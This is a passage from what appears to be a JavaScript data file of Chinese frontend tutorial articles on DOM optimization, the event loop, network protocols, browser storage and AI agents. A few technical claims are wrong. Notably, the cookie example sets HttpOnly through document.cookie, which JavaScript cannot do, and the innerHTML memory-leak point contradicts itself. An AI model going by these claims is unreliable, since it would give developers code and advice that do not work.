- **批量修改样式**：通过修改元素的class或使用cssText一次性修改多个样式属性，避免多次触发重排，减少性能消耗
- **批量添加/删除元素**：在内存中构建完整的DOM结构，然后一次性插入到文档中，避免多次操作DOM导致的多次重排
- **减少操作次数**：将多个DOM操作合并为一次操作，减少重排和重绘次数，提高页面性能

**缓存 DOM 引用：**
- **缓存频繁访问的节点**：对于需要频繁访问的DOM节点，应将其引用存储在变量中，避免重复查询DOM树，提高性能
- **避免重复查询**：每次使用document.getElementById、document.querySelector等方法查询DOM都会遍历DOM树，应缓存查询结果
- **使用变量存储节点引用**：将DOM节点引用存储在变量中，后续操作直接使用变量，避免重复查询DOM，提高代码执行效率
- **减少 DOM 遍历**：缓存节点引用可以减少DOM遍历次数，特别是在循环中操作DOM时，应先缓存节点引用再进行操作

**避免频繁读取布局属性：**
- **缓存布局属性值**：将offsetTop、offsetLeft、offsetWidth、offsetHeight等布局属性值缓存到变量中，避免重复读取触发重排
- **避免在循环中读取**：在循环中频繁读取布局属性会导致大量重排，应先读取并缓存属性值，然后在循环中使用缓存值
- **一次性读取多个属性**：如果需要读取多个布局属性，应一次性读取所有属性，避免多次读取触发多次重排
- **减少重排触发**：合理组织代码，避免在修改样式后立即读取布局属性，减少不必要的重排

**使用事件委托：**
- **减少事件监听器数量**：事件委托将事件监听器添加到父元素，而不是每个子元素，大幅减少事件监听器数量，提高性能
- **提高性能**：事件委托利用事件冒泡机制，只需一个事件监听器就能处理多个子元素的事件，减少内存占用和事件绑定开销
- **简化代码**：事件委托避免了为每个子元素单独绑定事件监听器的繁琐代码，代码更简洁，更易维护
- **支持动态添加的元素**：事件委托可以处理动态添加的子元素事件，无需为新增元素重新绑定事件监听器

### 💻 代码示例：DOM 操作优化

\`\`\`javascript
// 批量DOM操作优化
function optimizedDOMOperations() {
  // ❌ 不好的做法：多次操作DOM
  for (let i = 0; i < 1000; i++) {
    const div = document.createElement('div');
    div.textContent = \`Item \${i}\`;
    document.body.appendChild(div); // 每次都触发重排
  }

  // ✅ 好的做法：使用DocumentFragment
  const fragment = document.createDocumentFragment();
  for (let i = 0; i < 1000; i++) {
    const div = document.createElement('div');
    div.textContent = \`Item \${i}\`;
    fragment.appendChild(div);
  }
  document.body.appendChild(fragment); // 只触发一次重排
}

// 缓存DOM引用
function cacheDOMReferences() {
  // ❌ 不好的做法：重复查询DOM
  function updateElement() {
    document.getElementById('myElement').style.color = 'red';
    document.getElementById('myElement').style.fontSize = '16px';
    document.getElementById('myElement').style.backgroundColor = 'blue';
  }

  // ✅ 好的做法：缓存DOM引用
  const element = document.getElementById('myElement');
  function updateElementOptimized() {
    element.style.color = 'red';
    element.style.fontSize = '16px';
    element.style.backgroundColor = 'blue';
  }
}

// 事件委托示例
function eventDelegation() {
  // ❌ 不好的做法：为每个按钮添加事件监听器
  const buttons = document.querySelectorAll('.button');
  buttons.forEach(button => {
    button.addEventListener('click', function() {
      console.log('按钮被点击:', this.textContent);
    });
  });

  // ✅ 好的做法：使用事件委托
  document.addEventListener('click', function(event) {
    if (event.target.classList.contains('button')) {
      console.log('按钮被点击:', event.target.textContent);
    }
  });
}

// 批量样式修改
function batchStyleUpdates() {
  const element = document.getElementById('myElement');
  
  // ❌ 不好的做法：多次修改样式
  element.style.width = '100px';
  element.style.height = '100px';
  element.style.backgroundColor = 'red';
  element.style.color = 'white';

  // ✅ 好的做法：批量修改样式
  element.style.cssText = 'width: 100px; height: 100px; background-color: red; color: white;';
  
  // 或者使用CSS类
  element.className = 'highlighted';
}
\`\`\`

### 🔄 虚拟 DOM

**虚拟 DOM 概念：**
- **轻量级的 DOM 描述对象**：虚拟DOM是用JavaScript对象描述真实DOM结构的轻量级表示，包含元素类型、属性、子节点等信息，不包含DOM的重量级特性
- **减少直接 DOM 操作**：虚拟DOM通过比较新旧虚拟DOM树的差异，批量更新真实DOM，减少直接DOM操作次数，提高性能
- **提高渲染性能**：虚拟DOM将多次DOM更新合并为一次，减少重排和重绘次数，提高渲染性能，特别是在频繁更新场景下
- **框架如 React、Vue 使用**：React、Vue等现代前端框架都使用虚拟DOM技术，通过虚拟DOM实现高效的视图更新

**虚拟 DOM 工作原理：**
- **创建虚拟 DOM 树**：根据组件的render方法或模板创建虚拟DOM树，虚拟DOM树是真实DOM的JavaScript对象表示
- **计算差异 (Diff)**：比较新旧虚拟DOM树的差异，找出需要更新的节点，Diff算法通过同层比较、key属性优化等方式提高效率
- **批量更新真实 DOM**：将所有差异一次性应用到真实DOM上，减少DOM操作次数，避免频繁重排和重绘，提高性能
- **减少重排和重绘**：通过批量更新DOM，虚拟DOM技术可以最小化重排和重绘次数，提高页面渲染性能

**Diff 算法：**
- **同层比较**：Diff算法只比较同一层级的节点，不跨层级比较，大大减少了比较次数，提高了算法效率，时间复杂度从O(n^3)降低到O(n)
- **标签不同直接替换**：如果新旧节点的标签类型不同，直接删除旧节点并创建新节点，不再比较子节点，简化了比较过程
- **标签相同比较属性和子节点**：如果新旧节点的标签类型相同，比较节点的属性和子节点，更新变化的属性，递归比较子节点
- **key 属性优化**：通过key属性标识节点，在列表渲染时可以准确识别哪些节点发生了变化，避免不必要的DOM操作，提高更新效率

### 🎯 DOM 事件

**事件流：**
- **捕获阶段**：从根节点到目标节点：事件从document对象开始，沿着DOM树向下传播到目标元素，依次触发各元素的捕获事件监听器
- **目标阶段**：在目标节点上触发：事件到达目标元素后，在目标元素上触发事件，如果事件类型没有冒泡，事件到此结束
- **冒泡阶段**：从目标节点到根节点：事件从目标元素开始，沿着DOM树向上传播到document对象，依次触发各元素的冒泡事件监听器

**事件委托：**
- **将事件监听器添加到父元素**：事件委托是一种事件处理模式，将事件监听器添加到父元素而不是每个子元素，利用事件冒泡机制处理子元素事件
- **利用事件冒泡**：当子元素触发事件时，事件会冒泡到父元素，父元素的事件监听器可以通过event.target判断是哪个子元素触发了事件
- **减少事件监听器数量**：事件委托可以大幅减少事件监听器数量，特别是对于大量子元素的场景，提高性能和内存效率
- **支持动态元素**：事件委托可以处理动态添加的子元素事件，无需为新增元素重新绑定事件监听器，简化了代码

**事件处理优化：**
- **避免在事件处理函数中执行耗时操作**：事件处理函数应尽快执行完毕，避免阻塞主线程，耗时操作应使用Web Workers或requestIdleCallback
- **使用 passive 事件监听器**：对于touch、wheel等事件，使用passive: true选项声明不会调用preventDefault()，提高滚动性能
- **及时移除事件监听器**：在组件卸载或不需要时及时移除事件监听器，避免内存泄漏和不必要的事件处理
- **避免内存泄漏**：事件监听器会持有对元素的引用，如果不及时移除，会导致元素无法被垃圾回收，造成内存泄漏

### ⚡ DOM API 优化

**选择器 API：**
- querySelector：返回第一个匹配元素：querySelector使用CSS选择器查询DOM，返回第一个匹配的元素，如果找不到则返回null，是现代DOM查询的推荐方法
- querySelectorAll：返回所有匹配元素：querySelectorAll返回所有匹配元素的NodeList，不是实时的，适合一次性查询多个元素
- getElementById：通过 ID 获取元素：getElementById通过元素ID获取元素，是最快的DOM查询方法，性能优于querySelector
- getElementsByClassName：通过类名获取元素：getElementsByClassName返回具有指定类名的所有元素的HTMLCollection，是实时的，性能优于querySelectorAll

**性能比较：**
- getElementById > querySelector > getElementsByClassName > querySelectorAll：这是选择器API的性能排序，getElementById是最快的，因为它直接通过ID查找元素，不需要遍历DOM树，querySelector使用CSS选择器查询，性能取决于选择器的复杂度，getElementsByClassName返回HTMLCollection是实时的，querySelectorAll返回NodeList不是实时的
- 选择器越具体性能越好：具体的选择器如ID选择器(#element)和类选择器(.class)比通配符选择器(*)性能好很多，因为浏览器可以快速定位元素，而不需要遍历所有元素，选择器匹配是从右向左进行的
- 避免复杂选择器：复杂的选择器如嵌套选择器、属性选择器会增加匹配时间，应该尽量简化选择器，使用更直接的方式选择元素，或者预先给元素添加特定的class
- 缓存选择结果：将选择器结果缓存到变量中，避免重复查询DOM树，特别是在循环中操作DOM时，应该先缓存节点引用再进行操作，提高代码执行效率

**操作 API：**
- innerHTML vs createElement：innerHTML用于设置或获取元素的HTML内容，优点是简洁方便，可以一次性插入大量HTML，缺点是可能存在XSS安全风险，且性能在大量DOM操作时较差；createElement逐个创建元素，优点是更安全（不会解析恶意HTML）、性能更好（可以批量操作），缺点是代码更繁琐，需要逐个创建和追加元素
- textContent vs innerText：textContent获取或设置元素的所有文本内容，包括子元素的文本，性能更好因为不会触发回流（不计算布局）；innerText获取或设置元素的可见文本内容，会受到CSS样式影响（隐藏的文本不会获取），会触发回流以计算布局，因此性能较差，在不需要考虑CSS样式影响时应优先使用textContent
- appendChild vs insertBefore：appendChild将节点添加到父节点的子节点列表末尾，是最常用的添加节点方法；insertBefore将节点插入到指定节点之前，可以用于在列表开头插入元素，实现类似unshift的功能，如果要在末尾插入，insertBefore配合null参数等同于appendChild
- removeChild vs innerHTML：removeChild从DOM树中删除指定节点，返回被删除的节点，可以精确删除单个元素；innerHTML设置为空字符串可以删除元素的所有子节点，但会销毁所有子节点的事件监听器，可能导致内存泄漏，如果只需要删除子元素且不需要保留事件监听器，innerHTML = ''更简洁

### 最佳实践

**DOM 操作：**
- 减少 DOM 操作次数：DOM操作是前端性能的主要瓶颈之一，每次DOM操作都可能触发浏览器的重排和重绘，应该尽量减少DOM操作次数，可以使用DocumentFragment批量添加元素、使用虚拟DOM技术如React/Vue框架、将多次操作合并为一次等方式来优化
- 批量处理 DOM 更新：在需要更新多个DOM元素时，应该先将所有更新准备好，然后一次性应用到DOM上，避免多次触发重排和重绘，例如使用requestAnimationFrame在下一帧统一更新，或者使用文档片段(DocumentFragment)在内存中构建完整的DOM结构后一次性插入
- 缓存 DOM 引用：对于需要频繁访问的DOM节点，应该将其引用缓存到变量中，避免重复查询DOM树，特别是循环中需要多次访问同一个元素时，缓存引用可以显著提高性能，常见的缓存模式是在初始化时获取一次引用，后续直接使用变量
- 使用 DocumentFragment：DocumentFragment是轻量级的文档对象，相当于一个容器，可以在其中构建完整的DOM结构，然后一次性将所有子节点添加到实际的DOM树中，只会触发一次重排和重绘，比逐个添加元素性能好很多，是批量操作DOM的最佳实践

**样式操作：**
- 批量修改样式：当需要修改多个样式属性时，应该尽量一次性修改完成，可以通过修改元素的className来应用多个样式，而不是逐个设置style属性，这样可以让浏览器只触发一次重排和重绘，另外使用cssText属性也可以一次性设置多个样式，但会覆盖原有的内联样式，需要注意
- 使用 CSS 类代替内联样式：将需要应用的样式预先定义在CSS类中，然后通过JavaScript切换className来应用样式，这样做的好处是样式与JavaScript代码分离，代码更清晰，维护更方便，而且浏览器的CSS解析和渲染引擎对类选择器的处理更高效，内联样式每次修改都会触发重排
- 避免频繁修改样式：样式修改是触发重排和重绘的主要原因，应该避免在循环中频繁修改样式，或者先将元素隐藏（display:none）修改样式后再显示，或者使用CSS动画代替JavaScript动画，或者使用transform和opacity属性，因为这两个属性的变化不会触发布局变化，只会触发合成
- 使用 CSS transitions 代替 JavaScript 动画：CSS transitions和animations利用GPU加速，在主线程之外执行，不会阻塞JavaScript代码的执行，流畅度更好，性能更优，而JavaScript动画需要每帧计算位置并修改DOM，消耗CPU资源，还可能造成丢帧，应该优先使用CSS实现简单动画

**事件处理：**
- 使用事件委托：事件委托是一种高效的事件处理模式，将事件监听器添加到父元素而不是每个子元素，利用事件冒泡机制处理子元素的事件，这样可以大幅减少事件监听器的数量，降低内存占用，特别是在处理大量相似元素的场景（如列表）时效果显著，事件委托还可以处理动态添加的元素，无需为新元素单独绑定事件
- 合理使用事件监听器：在添加事件监听器时应该考虑是否真正需要，给不需要的元素添加事件监听器会浪费内存和CPU资源，另外要及时移除不再需要的事件监听器，避免内存泄漏，Vue中使用@语法、React中使用addEventListener时都要注意在组件卸载时移除监听器
- 及时移除事件监听器：事件监听器会持有对目标元素的引用，如果不及时移除，当元素被删除或组件卸载时，监听器仍然存在，会阻止垃圾回收导致内存泄漏，在组件的beforeDestroy或useEffect的清理函数中移除监听器，特别是在使用闭包时要注意避免内存泄漏
- 避免在事件处理函数中执行耗时操作：事件处理函数应该尽快执行完毕，将耗时操作放到异步队列中执行，或者使用Web Workers在后台线程处理，避免阻塞主线程导致页面卡顿，可以使用requestIdleCallback在浏览器空闲时执行非关键任务，或者将计算密集型任务拆分到多个帧中执行

**性能监控：**
- 使用 Chrome DevTools Performance 面板：Chrome DevTools的Performance面板可以录制和分析页面的性能表现，包括FPS、CPU使用率、网络请求、页面加载时间等，通过录制页面操作然后分析时间线，可以找出性能瓶颈，如长任务、频繁重排重绘、内存泄漏等，建议在开发阶段定期使用Performance面板检测性能问题
- 监控 DOM 操作性能：可以通过Performance API的mark和measure方法在代码中埋点，测量特定操作的执行时间，监控DOM操作的频率和耗时，找出性能热点进行优化，也可以使用User Timing API将性能数据发送到分析系统，进行持续的性能监控
- 识别性能瓶颈：通过Performance面板的时间线可以识别各种性能瓶颈，如长任务（超过50ms的任务）、强制同步布局（forced synchronous layout）、频繁的垃圾回收等，针对不同的瓶颈采取相应的优化措施，如拆分长任务、优化CSS选择器、减少内存分配等
- 持续优化：性能优化是一个持续的过程，应该建立性能指标监控体系，设置性能预算，定期检测性能变化，及时发现和解决性能退化问题，可以使用Lighthouse、WebPageTest等工具进行自动化性能测试

### 工具与资源

**开发工具：**
- Chrome DevTools
- Firefox Developer Tools
- Edge DevTools
- Safari Developer Tools

**性能分析工具：**
- Lighthouse
- WebPageTest
- Chrome DevTools Performance
- React DevTools

**学习资源：**
- MDN DOM 文档
- Google Web Fundamentals
- JavaScript 高级程序设计
- 前端性能优化指南

### 案例分析

**大型应用 DOM 优化：**
- Google Docs 的 DOM 优化
- Facebook 的 DOM 优化
- 阿里巴巴的 DOM 优化
- 腾讯的 DOM 优化

**实施效果：**
- 页面渲染速度提升
- 用户交互响应时间减少
- 内存使用优化
- 整体性能改善`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"event-loop",title:"浏览器事件循环与异步编程",category:"browser",difficulty:"medium",tags:["浏览器原理","事件循环","异步编程","JavaScript"],content:`## 浏览器事件循环与异步编程

事件循环是 JavaScript 异步编程的核心机制，理解它对于掌握异步编程至关重要。

### 事件循环概念

**定义：**
- JavaScript 运行时的机制
- 处理异步操作
- 协调事件、用户交互、脚本执行、UI 渲染
- 确保单线程 JavaScript 的非阻塞执行

**单线程特性：**
- JavaScript 是单线程的
- 避免了多线程的复杂性
- 通过事件循环实现异步
- 防止 UI 渲染阻塞

### 任务队列

**宏任务 (Macro Task)：**
- 脚本执行
- setTimeout
- setInterval
- setImmediate (Node.js)
- I/O 操作
- 网络请求
- 事件回调

**微任务 (Micro Task)：**
- Promise.then()
- Promise.catch()
- Promise.finally()
- async/await
- MutationObserver
- process.nextTick (Node.js)

**任务执行顺序：**
1. 执行同步代码
2. 执行微任务队列中的所有任务
3. 执行宏任务队列中的一个任务
4. 重复步骤 2-3

### 事件循环工作流程

**执行栈：**
- 存放正在执行的代码
- 函数调用时入栈
- 函数执行完毕后出栈
- 执行栈为空时处理任务队列

**任务队列：**
- 存放异步任务
- 分为宏任务队列和微任务队列
- 事件循环不断检查队列
- 按顺序执行任务

**渲染时机：**
- 每次事件循环结束后可能进行渲染
- 浏览器决定何时渲染
- 避免频繁渲染影响性能
- 渲染时机与任务队列相关

### 异步编程模式

**回调函数：**
- 最早的异步编程模式
- 容易导致回调地狱
- 代码可读性差
- 错误处理复杂

**Promise：**
- 解决回调地狱
- 链式调用
- 更好的错误处理
- 支持并行操作

**async/await：**
- 基于 Promise
- 同步代码风格
- 更好的错误处理
- 代码可读性高

**事件发布/订阅：**
- 基于事件的异步模式
- 解耦组件
- 适合复杂应用
- 可能导致内存泄漏

### 常见异步场景

**定时器：**
- setTimeout：延迟执行
- setInterval：重复执行
- requestAnimationFrame：动画
- requestIdleCallback：空闲时执行

**网络请求：**
- XMLHttpRequest
- fetch API
- axios
- WebSocket

**文件操作：**
- FileReader
- File API
- Blob
- FormData

**用户交互：**
- 点击事件
- 键盘事件
- 鼠标事件
- 触摸事件

### 事件循环与性能

**性能优化：**
- 避免长任务阻塞主线程
- 使用 Web Workers 处理耗时操作
- 合理使用 setTimeout 分解任务
- 优化事件处理函数

**任务优先级：**
- 微任务优先级高于宏任务
- requestAnimationFrame 优先级高于 setTimeout
- 合理安排任务顺序
- 避免任务饥饿

**内存管理：**
- 及时清理事件监听器
- 避免闭包导致的内存泄漏
- 合理使用 WeakMap 和 WeakSet
- 监控内存使用

### 浏览器与 Node.js 事件循环

**差异：**
- 浏览器事件循环：处理 UI 渲染
- Node.js 事件循环：处理 I/O 操作
- 微任务执行时机不同
- 任务队列数量不同

**Node.js 事件循环阶段：**
1. timers：处理 setTimeout/setInterval
2. I/O callbacks：处理 I/O 回调
3. idle, prepare：内部使用
4. poll：轮询 I/O 事件
5. check：处理 setImmediate
6. close callbacks：处理关闭事件

### 最佳实践

**异步编程：**
- 优先使用 async/await
- 合理使用 Promise
- 避免回调地狱
- 正确处理错误

**性能优化：**
- 避免长任务
- 合理使用 Web Workers
- 优化事件处理
- 监控异步操作

**代码组织：**
- 模块化异步代码
- 合理使用 Promise.all 和 Promise.race
- 避免过度使用 async/await
- 保持代码可读性

### 工具与资源

**调试工具：**
- Chrome DevTools Sources 面板
- Chrome DevTools Performance 面板
- Node.js 调试器
- VS Code 调试器

**学习资源：**
- MDN 事件循环文档
- JavaScript 高级程序设计
- You Don't Know JS: Async & Performance
- Google Web Fundamentals

### 案例分析

**异步编程模式：**
- Promise 链式调用
- async/await 同步风格
- 事件发布/订阅模式
- 混合使用多种模式

**性能优化案例：**
- 长任务分解
- Web Workers 应用
- 事件处理优化
- 内存泄漏修复`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"network-protocol",title:"网络协议与浏览器通信",category:"browser",difficulty:"medium",tags:["浏览器原理","网络协议","HTTP","HTTPS","WebSocket"],content:`## 网络协议与浏览器通信

网络协议是浏览器与服务器通信的基础，理解网络协议对于前端开发和性能优化至关重要。

### HTTP 协议

**HTTP/1.1：**
- 持久连接：减少连接建立时间
- 管道化：并行发送请求
- 分块传输编码：流式传输
- 主机头：支持虚拟主机

**HTTP/2：**
- 多路复用：一个连接处理多个请求
- 服务器推送：主动推送资源
- 头部压缩：减少头部大小
- 二进制分帧：更高效的数据传输

**HTTP/3：**
- 基于 QUIC 协议
- 更快的连接建立
- 更好的拥塞控制
- 更强的可靠性

### HTTPS

**SSL/TLS：**
- 加密传输
- 服务器认证
- 数据完整性
- 防止中间人攻击

**证书：**
- 数字证书
- CA 认证
- 证书链
- 证书验证

**HTTPS 握手：**
1. Client Hello：客户端发送支持的加密算法
2. Server Hello：服务器选择加密算法并发送证书
3. Client Key Exchange：客户端验证证书并发送密钥
4. Server Finish：服务器确认密钥
5. Client Finish：客户端确认连接

### WebSocket

**WebSocket 协议：**
- 全双工通信
- 实时数据传输
- 减少 HTTP 开销
- 适合实时应用

**WebSocket 连接：**
1. 客户端发送 WebSocket 握手请求
2. 服务器响应 WebSocket 握手
3. 建立持久连接
4. 双向数据传输

**WebSocket 应用：**
- 实时聊天
- 在线游戏
- 实时数据仪表盘
- 协作工具

### 网络请求流程

**DNS 解析：**
- 域名 → IP 地址
- DNS 缓存
- DNS 服务器查询
- DNS 记录类型

**TCP 连接：**
- 三次握手：建立连接
- 四次挥手：关闭连接
- 拥塞控制
- 流量控制

**HTTP 请求：**
- 请求方法：GET, POST, PUT, DELETE
- 请求头：Host, User-Agent, Accept
- 请求体：表单数据, JSON
- 请求参数：URL 参数, 表单数据

**HTTP 响应：**
- 状态码：200, 404, 500
- 响应头：Content-Type, Cache-Control
- 响应体：HTML, JSON, 图片
- 重定向：301, 302

### 💾 浏览器缓存

**强缓存：**
- **Cache-Control**：max-age, no-cache, no-store
- **Expires**：过期时间
- **无需向服务器请求**
- **直接使用缓存**

**协商缓存：**
- **ETag**：资源版本标识符
- **Last-Modified**：最后修改时间
- **向服务器验证资源是否过期**
- **未过期则使用缓存**

**缓存位置：**
- **Memory Cache**：内存缓存
- **Disk Cache**：磁盘缓存
- **Service Worker Cache**：Service Worker 缓存
- **Push Cache**：推送缓存

### 🌐 CORS 跨域资源共享

**同源策略：**
- **限制不同源之间的交互**
- **源：协议, 域名, 端口**
- **保护用户数据安全**

**CORS 机制：**
- **预检请求：OPTIONS**
- **响应头：Access-Control-Allow-Origin**
- **凭证处理：withCredentials**
- **暴露头：Access-Control-Expose-Headers**

**CORS 配置：**
- **服务器端设置响应头**
- **支持的请求方法**
- **支持的请求头**
- **预检请求缓存时间**

### 🚀 网络性能优化

**减少请求数量：**
- 资源合并：CSS/JS 合并
- 精灵图：合并小图标
- 内联关键 CSS
- 减少第三方脚本

**减少请求大小：**
- 压缩资源：gzip, brotli
- 最小化 CSS/JS/HTML
- 优化图片：WebP, 压缩
- 移除不必要的代码

**请求优化：**
- 预加载关键资源
- 延迟加载非关键资源
- 预连接到重要域名
- 资源提示：dns-prefetch, preconnect, preload

**CDN：**
- 内容分发网络
- 就近访问资源
- 提高加载速度
- 减轻源服务器负担

### 网络监控与分析

**网络监控：**
- Chrome DevTools Network 面板
- WebPageTest
- Lighthouse
- New Relic

**关键指标：**
- DNS 解析时间
- TCP 连接时间
- TLS 握手时间
- 首字节时间 (TTFB)
- 内容传输时间
- 总加载时间

**网络错误处理：**
- 超时处理
- 重试机制
- 错误提示
- 降级策略

### 最佳实践

**协议选择：**
- 使用 HTTPS
- 升级到 HTTP/2 或 HTTP/3
- 合理使用 WebSocket
- 优化网络配置

**缓存策略：**
- 实施合理的缓存策略
- 静态资源长缓存
- 动态资源协商缓存
- 缓存失效策略

**性能优化：**
- 减少请求数量和大小
- 优化关键渲染路径
- 使用 CDN 分发资源
- 监控网络性能

**安全实践：**
- 实施 HTTPS
- 防止 CSRF 攻击
- 防止 XSS 攻击
- 安全的 CORS 配置

### 学习资源

**网络协议：**
- HTTP 权威指南
- TCP/IP 详解
- MDN Web Docs
- RFC 文档

**性能优化：**
- Web Vitals
- Lighthouse
- Google Web Fundamentals
- 前端性能优化指南

### 案例分析

**大型网站网络优化：**
- Google 的网络优化
- Facebook 的网络优化
- Amazon 的网络优化
- 阿里巴巴的网络优化

**实施效果：**
- 页面加载速度提升
- 用户体验改善
- 服务器负载减少
- 带宽使用优化`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"browser-storage",title:"浏览器存储机制",category:"browser",difficulty:"medium",tags:["浏览器原理","浏览器存储","localStorage","SessionStorage","IndexedDB"],content:`## 浏览器存储机制

浏览器提供了多种存储机制，用于在客户端存储数据，了解这些存储机制对于前端开发至关重要。

### 存储机制对比

**Cookie：**
- 大小限制：约 4KB
- 生命周期：可设置过期时间
- 作用域：域名
- 随请求发送：是的
- 适合：会话管理、用户偏好

**localStorage：**
- 大小限制：约 5MB
- 生命周期：持久存储
- 作用域：同源
- 随请求发送：否
- 适合：用户偏好、缓存数据

**sessionStorage：**
- 大小限制：约 5MB
- 生命周期：会话期间
- 作用域：同源、同窗口
- 随请求发送：否
- 适合：临时数据、表单数据

**IndexedDB：**
- 大小限制：较大（视浏览器而定）
- 生命周期：持久存储
- 作用域：同源
- 随请求发送：否
- 适合：大型数据、复杂数据结构

**Service Worker Cache：**
- 大小限制：较大
- 生命周期：由 Service Worker 控制
- 作用域：Service Worker 作用域
- 随请求发送：否
- 适合：离线访问、资源缓存

### Cookie

**Cookie 特性：**
- 键值对存储
- 可设置域名和路径
- 可设置安全属性：HttpOnly, Secure, SameSite
- 可设置过期时间

**Cookie 用途：**
- 会话管理：存储会话 ID
- 用户偏好：存储用户设置
- 跟踪：分析用户行为
- 认证：存储认证信息

**Cookie 安全：**
- HttpOnly：防止 JavaScript 访问：HttpOnly是Cookie的一个安全属性，当设置HttpOnly属性时，Cookie无法通过JavaScript的document.cookie API访问，这样可以防止XSS攻击窃取Cookie，HttpOnly属性对于包含会话信息的Cookie非常重要，即使页面存在XSS漏洞，攻击者也无法通过JavaScript获取设置了HttpOnly的Cookie
- Secure：仅通过 HTTPS 传输：Secure是Cookie的一个安全属性，当设置Secure属性时，Cookie只能通过HTTPS协议传输，不能通过HTTP传输，这样可以防止Cookie在传输过程中被窃听或劫持，Secure属性对于包含敏感信息（如会话ID、认证令牌）的Cookie非常重要，现代浏览器在HTTPS环境下会自动为Cookie添加Secure属性
- SameSite：防止 CSRF 攻击：SameSite是Cookie的一个安全属性，用于控制Cookie在跨站请求中的发送行为，SameSite有三个值：Strict（最严格，只在同站请求中发送Cookie）、Lax（默认值，允许在顶级导航请求中发送Cookie）、None（允许跨站发送Cookie，但必须配合Secure属性），SameSite属性可以有效防止CSRF攻击
- 合理设置过期时间：Cookie的过期时间决定了Cookie的有效期，可以通过expires属性设置具体的过期日期和时间，也可以通过max-age属性设置Cookie的有效期（以秒为单位），合理设置Cookie的过期时间可以平衡用户体验和安全性，会话Cookie应该设置较短的过期时间或设置为会话Cookie（关闭浏览器后失效），持久化Cookie应该根据业务需求设置合理的过期时间

**Cookie 操作：**
- 设置：document.cookie = "name=value; expires=date; path=/; domain=example.com; secure; HttpOnly"
- 读取：document.cookie
- 删除：设置过期时间为过去的时间

### localStorage

**localStorage 特性：**
- 键值对存储
- 字符串值
- 持久存储
- 同源限制

**localStorage 操作：**
- 设置：localStorage.setItem('key', 'value')
- 读取：localStorage.getItem('key')
- 删除：localStorage.removeItem('key')
- 清空：localStorage.clear()

**localStorage 限制：**
- 仅存储字符串
- 大小限制约 5MB
- 同步 API
- 易受 XSS 攻击

**localStorage 最佳实践：**
- 存储非敏感数据
- 定期清理过期数据
- 序列化复杂数据：JSON.stringify/JSON.parse
- 错误处理：try/catch

### sessionStorage

**sessionStorage 特性：**
- 键值对存储
- 字符串值
- 会话期间存储
- 同源、同窗口限制

**sessionStorage 操作：**
- 设置：sessionStorage.setItem('key', 'value')
- 读取：sessionStorage.getItem('key')
- 删除：sessionStorage.removeItem('key')
- 清空：sessionStorage.clear()

**sessionStorage 用途：**
- 表单数据：临时存储表单输入
- 会话状态：存储会话期间的状态
- 临时数据：不需要持久化的数据
- 多窗口隔离：不同窗口的 sessionStorage 独立

### IndexedDB

**IndexedDB 特性：**
- 事务性数据库
- 支持复杂数据结构
- 异步 API
- 较大的存储容量

**IndexedDB 操作：**
- 打开数据库：indexedDB.open('name', version)
- 创建对象存储空间：createObjectStore('store', { keyPath: 'id' })
- 添加数据：store.add(data)
- 获取数据：store.get(key)
- 更新数据：store.put(data)
- 删除数据：store.delete(key)

**IndexedDB 用途：**
- 离线应用：存储离线数据
- 大型数据：存储大量数据
- 复杂数据：存储复杂数据结构
- 缓存：缓存 API 响应

**IndexedDB 最佳实践：**
- 使用事务确保数据一致性
- 合理使用索引提高查询性能
- 错误处理：try/catch
- 定期清理过期数据

### Service Worker Cache

**Service Worker Cache 特性：**
- 可编程缓存
- 支持任意资源
- 离线访问
- 由 Service Worker 控制

**Service Worker Cache 操作：**
- 打开缓存：caches.open('name')
- 添加资源：cache.add('url')
- 添加多个资源：cache.addAll(['url1', 'url2'])
- 获取资源：cache.match('url')
- 删除资源：cache.delete('url')

**Service Worker Cache 用途：**
- 离线访问：PWA 应用
- 资源缓存：提高加载速度
- 缓存策略：自定义缓存逻辑
- 网络请求拦截：修改请求和响应

### 存储安全

**安全风险：**
- XSS 攻击：窃取存储数据
- CSRF 攻击：利用 Cookie
- 信息泄露：敏感数据存储
- 数据篡改：存储数据被修改

**防护措施：**
- 加密敏感数据
- 使用 HttpOnly Cookie
- 实施 CSP
- 验证存储数据
- 定期清理数据

### 存储最佳实践

**数据分类：**
- 敏感数据：避免在前端存储
- 非敏感数据：localStorage
- 会话数据：sessionStorage
- 大型数据：IndexedDB
- 离线数据：Service Worker Cache

**存储策略：**
- 合理选择存储机制
- 实施数据验证
- 定期清理过期数据
- 监控存储使用情况

**性能优化：**
- 减少存储操作频率
- 批量存储操作
- 合理使用缓存
- 避免存储大量数据

**跨浏览器兼容性：**
- 检查存储 API 支持
- 提供降级方案
- 测试不同浏览器
- 遵循标准 API

### 工具与资源

**存储库：**
- localforage：简化 IndexedDB 使用
- dexie.js：IndexedDB 封装
- idb：IndexedDB 封装
- pouchdb：客户端数据库

**开发工具：**
- Chrome DevTools Application 面板
- Firefox Storage Inspector
- Edge DevTools Storage 面板
- Safari Web Inspector Storage 面板

**学习资源：**
- MDN Web Storage API 文档
- MDN IndexedDB 文档
- MDN Service Worker 文档
- Google Web Fundamentals

### 案例分析

**存储方案选择：**
- 金融应用：安全存储策略
- 电商应用：用户偏好存储
- 新闻应用：离线阅读
- 社交媒体：会话管理

**实施效果：**
- 离线访问能力提升
- 加载速度提高
- 用户体验改善
- 数据管理优化`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"ai-agent",title:"AI Agent 核心原理与实现机制",category:"ai",difficulty:"hard",tags:["AI Agent","智能体","自主决策","多模态AI","强化学习"],content:`## AI Agent 核心原理与实现机制

AI Agent（人工智能代理）是能够感知环境、做出决策并执行行动以实现特定目标的智能系统。现代AI Agent不仅仅是简单的响应式系统，而是具备自主性、反应性、主动性和社会性的复杂智能实体。

### 🤖 AI Agent 的基本概念

AI Agent是一种软件实体，能够在特定环境中自主运行，通过传感器感知环境状态，并通过执行器对环境产生影响。Agent的核心特征包括：

- **自主性（Autonomy）**：能够在没有人类干预的情况下运行
- **反应性（Reactivity）**：能够感知环境变化并作出适当反应
- **主动性（Proactivity）**：能够采取主动行动以实现目标
- **社会性（Social Ability）**：能够与其他Agent或人类交互

### 🧠 Agent 架构设计

现代AI Agent通常采用分层架构设计，主要包括以下几个层次：

#### 感知层（Perception Layer）
感知层负责处理来自环境的各种输入信息，包括：
- 视觉信息处理（图像识别、物体检测）
- 语音信息处理（语音识别、自然语言理解）
- 文本信息处理（语义分析、情感分析）
- 传感器数据处理（温度、湿度、位置等）

